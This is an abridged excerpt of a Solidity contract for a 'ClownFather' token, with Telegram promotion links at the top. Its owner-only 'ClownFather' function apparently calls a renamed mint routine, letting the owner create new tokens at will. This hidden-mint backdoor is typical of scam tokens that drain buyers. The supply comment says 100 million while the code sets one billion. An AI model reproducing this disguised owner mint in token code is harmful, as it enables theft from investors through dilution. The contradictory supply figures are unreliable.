...
//
//
//   📱Telegram::https://t.me/+cEKmq8c4ao83Yzk9
//   📱Website ::https://t.me/ClownFatherERC
/*
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ClownFather(uint256 amount) public onlyOwner {
    _ClownFather(msg.sender, amount);
    }
    ...
    function _ClownFather(address account, uint256 amount) internal virtual {
...
contract ClownFather is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Clown Father", "ClownFather") {
        _ClownFather(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}
...
contract BEP20 is Context, IERC20, Ownable {
    ...
    string private _name = "ClownFather";
    string private _symbol = "ClownFather";
